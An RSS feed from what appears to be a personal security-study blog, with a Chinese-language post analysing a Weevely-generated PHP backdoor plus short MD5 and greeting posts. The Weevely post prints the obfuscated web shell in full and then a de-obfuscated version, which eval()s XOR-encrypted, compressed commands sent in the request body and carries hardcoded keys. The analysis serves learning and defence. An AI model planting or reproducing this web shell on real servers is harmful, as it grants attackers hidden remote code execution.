<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RealOne-8-1</title><link>https://66lueflam144.github.io/realOne81</link><description>easy</description><copyright>RealOne-8-1</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://cdn-icons-png.flaticon.com/512/3468/3468341.png</url><title>avatar</title><link>https://66lueflam144.github.io/realOne81</link></image><lastBuildDate>Tue, 28 May 2024 16:14:56 +0000</lastBuildDate><managingEditor>RealOne-8-1</managingEditor><ttl>60</ttl><webMaster>RealOne-8-1</webMaster><item><title>Weevely Wish</title><link>https://66lueflam144.github.io/realOne81/post/Weevely%20Wish.html</link><description>&#13;
Last Edited: March 25, 2024 7:28 PM&#13;
&#13;
# Weevely&#13;
&#13;
通过weevely生成php&#13;
&#13;
```php&#13;
&lt;?php&#13;
$u='){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch('/$k8ih8i(.+)$8ik8if8i/',@file_get_contents('p8ihp://8ii8';&#13;
$v='input'),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge';&#13;
$h='t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i'$p$kh$r$kf');}';&#13;
$d=str_replace('D','','cDrDeDaDDte_fuDnction');&#13;
$k='$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io='';for($i=08i;$i&lt;$l;8i){fo8ir($8ij=0;($j&lt;$c&amp;&amp;$i8i&lt;$l);8i$j+8i+,$i+8i+';&#13;
$Y='$k='88i8ic319f28';8i$kh8i='d81d1527a8i942'8i;$kf='8e98ia5c2195f5'8i;8i$p='ZnC8it8iZbYs8iDzbbdvRw';8ifunction 8ix($t,8i';&#13;
$A=str_replace('8i','',$Y.$k.$u.$v.$h);&#13;
$b=$d('',$A);$b();&#13;
?&gt;&#13;
&#13;
```&#13;
&#13;
进行一点分析&#13;
&#13;
```php&#13;
&lt;?php&#13;
//第一部分：&#13;
$u='){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch('/$k8ih8i(.+)$8ik8if8i/',@file_get_contents('p8ihp://8ii8';&#13;
$v='input'),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge';&#13;
$h='t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i'$p$kh$r$kf');}';&#13;
$k='$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io='';for($i=08i;$i&lt;$l;8i){fo8ir($8ij=0;($j&lt;$c&amp;&amp;$i8i&lt;$l);8i$j+8i+,$i+8i+';&#13;
$Y='$k='88i8ic319f28';8i$kh8i='d81d1527a8i942'8i;$kf='8e98ia5c2195f5'8i;8i$p='ZnC8it8iZbYs8iDzbbdvRw';8ifunction 8ix($t,8i';&#13;
$A=str_replace('8i','',$Y.$k.$u.$v.$h);&#13;
&#13;
//第二部分&#13;
$d=str_replace('D','','cDrDeDaDDte_fuDnction');&#13;
$b=$d('',$A);&#13;
$b();&#13;
?&gt;&#13;
&#13;
```&#13;
&#13;
# First Part&#13;
&#13;
首先，第一部分的进行替换字符之后，得到&#13;
&#13;
```php&#13;
$k='8c319f28';&#13;
$kh='d81d1527a942';&#13;
$kf='8e9a5c2195f5';&#13;
$p='ZnCtZbYsDzbbdvRw';&#13;
&#13;
function x($t, $k) {&#13;
    $c = strlen($k);&#13;
    $l = strlen($t);&#13;
    $o = '';&#13;
&#13;
    for ($i = 0; $i &lt; $l;) {&#13;
        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) {&#13;
            $o .= $t{$i} ^ $k{$j};&#13;
        }&#13;
    }&#13;
&#13;
    return $o;&#13;
}&#13;
&#13;
if(@preg_match('/$kh(.+)$kf/',@file_get_contents('php://input'),$m)==1) {&#13;
	@ob_start();&#13;
	@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));&#13;
	$o=@ob_get_contents();//获取当前缓冲区的内容，并返回缓冲区的数据&#13;
	@ob_end_clean();//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区&#13;
	$r=@base64_encode(@x(@gzcompress($o),$k));&#13;
	print('$p$kh$r$kf');}&#13;
```&#13;
&#13;
从if语句的部分开始拆分&#13;
&#13;
## *@preg_match('/$kh(.+)$kf/',@file_get_contents('php://input'),$m)*&#13;
&#13;
**'/$kh(.+)$kf/'**&#13;
&#13;
- `()`标记一个子表达式的开始和结束位置。</description><guid isPermaLink="true">https://66lueflam144.github.io/realOne81/post/Weevely%20Wish.html</guid><pubDate>Tue, 26 Mar 2024 00:41:28 +0000</pubDate></item><item><title>MD5 Learn</title><link>https://66lueflam144.github.io/realOne81/post/MD5%20Learn.html</link><description>&#13;
# MD5&#13;
&#13;
&gt; Message-DigestAlgorithm 5&#13;
&#13;
![MD5](https://s3.bmp.ovh/imgs/2022/02/784b757cee5f7bf0.png)&#13;
&#13;
一种被广泛使用的**密码散列函数**，可以产生出一个&lt;u&gt;128位&lt;/u&gt;（16个字符(BYTES)）的散列值（hash value），用于确保信息传输完整一致。</description><guid isPermaLink="true">https://66lueflam144.github.io/realOne81/post/MD5%20Learn.html</guid><pubDate>Mon, 25 Mar 2024 15:31:01 +0000</pubDate></item><item><title>Hello</title><link>https://66lueflam144.github.io/realOne81/post/Hello.html</link><description># Don't you know That I am The Real One&#13;
Just Shout It Out&#13;
&#13;
hello test for myself。</description><guid isPermaLink="true">https://66lueflam144.github.io/realOne81/post/Hello.html</guid><pubDate>Mon, 25 Mar 2024 11:54:42 +0000</pubDate></item></channel></rss>